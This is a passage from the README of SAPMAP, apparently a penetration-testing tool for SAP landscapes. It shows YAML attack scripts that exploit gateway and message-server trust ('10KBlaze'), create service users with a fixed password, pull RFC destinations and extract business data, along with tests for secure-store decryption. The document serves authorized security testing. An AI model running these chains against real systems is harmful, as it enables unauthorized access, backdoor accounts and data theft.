    client: "001"
```

### Example: Multi-System Landscape

```yaml
name: "SAP Landscape Attack"
description: "Scan 3 systems, exploit, propagate, analyze trust chains"

steps:
  - action: add_system
    sid: S4H
    ip: 192.168.2.209
    instance: "00"

  - action: add_system
    sid: TWT
    ip: 192.168.2.60
    instance: "00"

  - action: add_system
    sid: ORA
    ip: 192.168.2.16
    instance: "00"

  - action: check_all_gw

  - action: check_all_betrusted
    attacker_ip: auto

  - action: create_user
    target: S4H
    method: gw_exploit
    client: "001"

  - action: retrieve_rfcs
    target: S4H

  - action: impact_assess
    target: S4H
    client: "001"

  - action: analyze_chains
```

### Console Output

The script logs progress to the SAPMAP console:

```
[SCRIPT] === 10KBlaze Full Chain Demo ===
[SCRIPT] Compromise SAP S4H via betrusted + GW exploit, then extract business data
[SCRIPT] 8 steps to execute

[SCRIPT] Step 1/8: add_system on S4H
[SCRIPT] Step 1/8: completed
[SCRIPT] Step 2/8: check_gw on S4H
[SCRIPT] Step 2/8: completed
...
[SCRIPT] === All 8 steps completed ===
```

---

## State Management

### Saving & Loading

SAPMAP sessions are saved as `.sapmap` JSON files containing all nodes, connections, created users, and map positions. State is auto-saved on exit.

```bash
# Save via GUI: Ctrl+S or File menu
# Load via CLI:
python3 sapmap.py --load states/landscape_2026-03-11.sapmap
```

### Persistent Caches

Separate from session state, these persist across sessions:
- **RFC check cache** (`.sapmap_rfc_cache.json`) — Cached destination test results
- **Created destinations** (`.sapmap_created_destinations.json`) — Log of TCP/IP destinations created

---

## Testing

SAPMAP includes a unit test suite (405 tests) that validates core logic without network access:

```bash
python3 -m pytest tests/ -v
```

| Test File | Tests | Coverage |
|-----------|-------|----------|
| `test_ms_betrusted.py` | 114 | MS header build/parse, LOGIN/LOGOUT/MOD_STATE, ADM records, DP info, NILIST reply, opcode parsing |
| `test_10kblaze.py` | 42 | P1 lu_name fix, app-server name derivation, DP versions, NILIST IP reply, hostname extraction |
| `test_10kblaze_extended.py` | 57 | MS_CHANGE_IP, MS_SET_LOGON, GWMON reply, old NILIST body, NI framing, GW sub-structures |
| `test_secstore_decrypt.py` | 25 | RSECTAB decryption, keyprime derivation, IDENT categorisation, SSFS key extraction |
| `test_rsec_cipher.py` | 11 | RSECCipher encode/decode roundtrip, rsec_decrypt, rsec_decrypt_key |
| `test_gw_protocol.py` | 12 | P1/P2 packet building, parse_response, hexdump, TLV encoding, SAPRFXPG |
| `test_models.py` | 9 | Data model serialization, risk_level, best_credentials, state management |
| `test_config.py` | 8 | Username generation, DB type normalization, SQL generators |
| Other tests | ~127 | Router, shell, scanner configuration |

---

## Configuration

Key constants in `sapmap_config.py`:

### User Creation

| Setting | Value | Description |
|---------|-------|-------------|
| `SAPMAP_USER_PREFIX` | `SAPMAP` | Username prefix (SAPMAP00–SAPMAP99) |
| `SAPMAP_PASSWORD` | `Andinyougo123!` | Password for all created users |
| `USER_TYPE` | `S` | Service user (no dialog logon restrictions) |
| `CODVN` | `G` | Password hash version (SHA-1 salted, kernel 7.x) |

### Scanning

| Setting | Default | Description |
|---------|---------|-------------|
| `DEFAULT_INSTANCE_RANGE` | `(0, 99)` | SAP instance numbers to scan |
| `DEFAULT_THREADS` | `20` | Concurrent scan threads |
| `DEFAULT_TIMEOUT` | `3` | Socket timeout in seconds |

### Supported Database Types

| Code | Database |
|------|----------|
| HDB | SAP HANA |
| ADA | MaxDB / SAP DB / ADABAS D |
| MSS | Microsoft SQL Server |
| ORA | Oracle |
| DB6 | IBM DB2 |

### Supported OS Types

Linux, Windows, AIX, HP-UX, SunOS

---

## License

For authorized security testing only. Unauthorized access to computer systems is illegal.
